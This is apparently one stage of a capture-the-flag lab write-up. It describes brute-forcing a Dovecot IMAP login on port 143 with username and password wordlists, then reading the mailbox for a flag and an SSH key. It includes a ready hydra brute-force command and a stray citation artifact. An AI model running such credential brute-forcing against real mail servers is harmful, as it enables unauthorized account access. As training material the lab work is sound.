# Stage 3 — IMAP + Brute Force + Mail Inspection

- Service: Dovecot IMAP on :143
- Approach: brute force with `guess_u.txt` + `key.txt`, then read mailbox to get `FLAG_3` and an attached SSH key for Stage 4. :contentReference[oaicite:20]{index=20}

Hydra example:
```bash
hydra -L ../../wordlists/guess_u.txt -P ../../wordlists/key.txt <IP> imap
````
